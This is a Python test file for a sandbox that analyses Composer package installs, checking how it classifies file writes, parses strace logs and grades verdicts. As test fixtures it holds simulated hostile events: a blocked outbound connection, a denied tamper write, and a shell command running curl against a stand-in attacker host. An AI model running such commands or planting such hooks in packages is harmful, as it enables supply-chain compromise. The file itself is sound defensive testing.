import tempfile
import unittest

from depshieldx.security.sandbox.sandbox_wrapper_composer import (
    BUNDLE_MOUNT_PREFIX,
    WORK_DIR,
    _build_verdicts,
    _classify_write_path,
    _parse_strace_log,
)


class ClassifyWritePathTests(unittest.TestCase):
    def test_bundle_directory_write_is_tamper_attempt(self):
        self.assertEqual(
            _classify_write_path(f"{BUNDLE_MOUNT_PREFIX}/demo-package-1.0.0.zip"),
            "bundle_source_tamper_attempt",
        )

    def test_vendor_write_is_vendor_files(self):
        self.assertEqual(
            _classify_write_path(f"{WORK_DIR}/scratch/vendor/demo/package/marker.txt"),
            "vendor_files",
        )

    def test_work_dir_write_is_project_files(self):
        self.assertEqual(_classify_write_path(f"{WORK_DIR}/scratch/composer.lock"), "project_files")

    def test_unrelated_path_is_other(self):
        self.assertEqual(_classify_write_path("/tmp/some-unrelated-file"), "other")


class ParseStraceLogTests(unittest.TestCase):
    def _write_log(self, content: str) -> str:
        handle = tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False)
        handle.write(content)
        handle.close()
        return handle.name

    def test_missing_log_file_returns_empty_evidence(self):
        evidence = _parse_strace_log("/nonexistent/path/does-not-exist.log")
        self.assertEqual(evidence["write_count"], 0)
        self.assertEqual(evidence["blocked_events"], [])

    def test_remote_connect_is_recorded_as_blocked_network_event(self):
        # Confirmed directly against a real hand-built package whose
        # "files" autoload entry attempts an outbound fsockopen() the
        # moment vendor/autoload.php is loaded -- the real connect()
        # this produces is denied at the OS level (retval -1) by the
        # container's own --network none, the same shape reproduced here.
        log_path = self._write_log(
            '9   connect(9, {sa_family=AF_INET, sin_port=htons(80), '
            'sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH (Network is unreachable)\n'
        )
        evidence = _parse_strace_log(log_path)
        self.assertEqual(evidence["syscall_counts"]["network"], 1)
        self.assertEqual(len(evidence["blocked_events"]), 1)
        self.assertEqual(evidence["blocked_events"][0]["category"], "network_denied")

    def test_write_into_bundle_directory_is_recorded_as_tamper_attempt(self):
        log_path = self._write_log(
            f'14   openat(AT_FDCWD, "{BUNDLE_MOUNT_PREFIX}/pwned.txt", '
            "O_WRONLY|O_CREAT|O_TRUNC, 0666) = -1 EACCES (Permission denied)\n"
        )
        evidence = _parse_strace_log(log_path)
        self.assertEqual(evidence["write_buckets"]["bundle_source_tamper_attempt"], 1)
        self.assertEqual(len(evidence["blocked_events"]), 1)
        self.assertEqual(evidence["blocked_events"][0]["category"], "bundle_tamper_denied")

    def test_normal_vendor_write_is_not_blocked(self):
        # Confirmed directly: a real "files" autoload entry writing a
        # marker file into its own installed vendor/ directory succeeds
        # (the sandbox's own writable work dir, not the read-only bundle
        # mount) and is correctly bucketed as informational evidence, not
        # a policy block.
        log_path = self._write_log(
            f'14   openat(AT_FDCWD, "{WORK_DIR}/scratch/vendor/demo/package/marker.txt", '
            "O_WRONLY|O_CREAT|O_TRUNC, 0666) = 5\n"
        )
        evidence = _parse_strace_log(log_path)
        self.assertEqual(evidence["write_buckets"]["vendor_files"], 1)
        self.assertEqual(evidence["blocked_events"], [])

    def test_execve_calls_are_deduplicated_into_subprocesses(self):
        log_path = self._write_log(
            '15   execve("/usr/bin/php", ["php", "DepshieldxProbe.php"], 0x0 /* 1 vars */) = 0\n'
            '17   execve("/usr/bin/php", ["php", "DepshieldxProbe.php"], 0x0 /* 1 vars */) = 0\n'
            '19   execve("/bin/sh", ["sh", "-c", "curl evil.example"], 0x0 /* 1 vars */) = 0\n'
        )
        evidence = _parse_strace_log(log_path)
        self.assertEqual(evidence["syscall_counts"]["process_exec"], 3)
        self.assertEqual(len(evidence["subprocesses"]), 2)
        self.assertIn(["php", "DepshieldxProbe.php"], evidence["subprocesses"])
        self.assertIn(["sh", "-c", "curl evil.example"], evidence["subprocesses"])

    def test_non_syscall_lines_are_ignored(self):
        log_path = self._write_log("PHP Warning: something\nnot a syscall line at all\n")
        evidence = _parse_strace_log(log_path)
        self.assertEqual(evidence["write_count"], 0)
        self.assertEqual(evidence["syscall_counts"], {"filesystem_mutation": 0, "process_exec": 0, "network": 0})


class BuildVerdictsTests(unittest.TestCase):
    def _empty_evidence(self):
        return {
            "write_count": 0,
            "write_buckets": {"project_files": 0, "vendor_files": 0, "bundle_source_tamper_attempt": 0, "other": 0},
            "syscall_counts": {"filesystem_mutation": 0, "process_exec": 0, "network": 0},
            "blocked_events": [],
        }

    def test_network_attempt_produces_high_severity_verdict(self):
        evidence = self._empty_evidence()
        evidence["blocked_events"] = [{"category": "network_denied", "detail": {}}]
        verdicts = _build_verdicts(evidence, probe_exit_code=0)
        codes = {v["code"]: v["severity"] for v in verdicts}
        self.assertEqual(codes["network_attempt_blocked"], "high")

    def test_bundle_tamper_produces_high_severity_verdict(self):
        evidence = self._empty_evidence()
        evidence["blocked_events"] = [{"category": "bundle_tamper_denied", "detail": {}}]
        verdicts = _build_verdicts(evidence, probe_exit_code=0)
        codes = {v["code"]: v["severity"] for v in verdicts}
        self.assertEqual(codes["bundle_source_tamper_attempted"], "high")

    def test_probe_failure_without_block_is_medium_not_high(self):
        # Unlike RubyGems' native-extension compilation (a common,
        # legitimately-offline-environment-only failure mode -- missing
        # dev headers, etc.), the Composer probe script here is trivial
        # (just requiring an already-successfully-generated autoloader)
        # -- there's no comparably common benign reason for it to fail,
        # so a bare failed exit code is treated as "medium", mirroring
        # sandbox_wrapper_nuget.py's own "build_failed"/"medium" choice
        # rather than RubyGems'/Pub's "info" downgrade.
        evidence = self._empty_evidence()
        verdicts = _build_verdicts(evidence, probe_exit_code=1)
        codes = {v["code"]: v["severity"] for v in verdicts}
        self.assertEqual(codes["autoload_probe_failed"], "medium")

    def test_probe_failure_with_block_does_not_also_report_probe_failed(self):
        evidence = self._empty_evidence()
        evidence["blocked_events"] = [{"category": "network_denied", "detail": {}}]
        verdicts = _build_verdicts(evidence, probe_exit_code=1)
        codes = {v["code"] for v in verdicts}
        self.assertNotIn("autoload_probe_failed", codes)

    def test_clean_successful_run_has_no_high_severity_verdicts(self):
        evidence = self._empty_evidence()
        evidence["syscall_counts"] = {"filesystem_mutation": 3, "process_exec": 1, "network": 0}
        verdicts = _build_verdicts(evidence, probe_exit_code=0)
        severities = {v["severity"] for v in verdicts}
        self.assertNotIn("high", severities)


if __name__ == "__main__":
    unittest.main()
